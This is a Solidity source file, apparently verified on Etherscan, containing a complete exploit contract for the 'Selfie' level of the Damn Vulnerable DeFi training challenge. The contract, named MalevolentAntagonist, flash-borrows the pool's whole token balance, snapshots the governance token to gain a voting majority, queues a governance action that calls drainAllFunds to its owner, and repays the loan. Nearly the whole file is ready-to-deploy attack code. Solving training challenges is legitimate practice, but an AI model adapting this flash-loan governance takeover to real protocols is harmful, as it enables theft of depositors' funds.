/**
 *Submitted for verification at Etherscan.io on 2022-03-15
*/

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IDamnValuableTokenSnapshot is IERC20 {
    function snapshot() external returns (uint256);

    function getBalanceAtLastSnapshot(address account)
        external
        view
        returns (uint256);

    function getTotalSupplyAtLastSnapshot() external view returns (uint256);
}

interface ISimpleGovernance {
    function governanceToken() external returns (IDamnValuableTokenSnapshot);

    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;

    event ActionQueued(uint256 actionId, address indexed caller);
    event ActionExecuted(uint256 actionId, address indexed caller);
}

interface ISelfiePool {
    function token() external returns (IDamnValuableTokenSnapshot);

    function governance() external returns (ISimpleGovernance);

    function flashLoan(uint256 borrowAmount) external;

    function drainAllFunds(address receiver) external;
}

//                     (
//         .            )        )
//                  (  (|              .
//              )   )\/ ( ( (
//      *  (   ((  /     ))\))  (  )    )
//    (     \   )\(          |  ))( )  (|
//    >)     ))/   |          )/  \((  ) \
//    (     (      .        -.     V )/   )(    (
//     \   /     .   \            .       \))   ))
//       )(      (  | |   )            .    (  /
//      )(    ,'))     \ /          \( `.    )
//      (\>  ,'/__      ))            __`.  /
//     ( \   | /  ___   ( \/     ___   \ | ( (
//      \.)  |/  /   \__      __/   \   \|  ))
//     .  \. |>  \      | __ |      /   <|  /
//          )/    \____/ :..: \____/     \ <
//   )   \ (|__  .      / ;: \          __| )  (
//  ((    )\)  ~--_     --  --      _--~    /  ))
//   \    (    |  ||               ||  |   (  /
//         \.  |  ||_             _||  |  /
//           > :  |  ~V+-I_I_I-+V~  |  : (.
//          (  \:  T\   _     _   /T  : ./
//           \  :    T^T T-+-T T^T    ;<
//            \..`_       -+-       _'  )
//               . `--=.._____..=--'. ./
//
contract MalevolentAntagonist {
    address public immutable s_owner;
    ISelfiePool public s_pool;
    ISimpleGovernance public s_gov;
    IDamnValuableTokenSnapshot public s_dvtSnap;

    event EmbezzlementProposed(uint256 indexed actionId);

    constructor(
        address owner,
        ISelfiePool pool,
        ISimpleGovernance gov,
        IDamnValuableTokenSnapshot dvtSnap
    ) {
        s_owner = owner;
        s_pool = pool;
        s_gov = gov;
        s_dvtSnap = dvtSnap;
    }

    function drain(IERC20 token) external {
        ISelfiePool pool = s_pool;
        // Borrow everything from pool
        uint256 balance = token.balanceOf(address(pool));
        pool.flashLoan(balance);
    }

    function receiveTokens(address token, uint256 amount) external {
        ISelfiePool pool = s_pool;
        IDamnValuableTokenSnapshot dvtSnap = s_dvtSnap;
        require(
            (msg.sender == address(pool)) && (token == address(dvtSnap)),
            "wtf"
        );

        // Establish a dictatorship
        dvtSnap.snapshot();

        // Propose to embezzle
        uint256 actionId = s_gov.queueAction(
            address(s_pool),
            abi.encodeWithSelector(ISelfiePool.drainAllFunds.selector, s_owner),
            0
        );
        emit EmbezzlementProposed(actionId);

        // Pay back loan
        dvtSnap.approve(address(this), amount);
        dvtSnap.transferFrom(address(this), address(pool), amount);
    }
}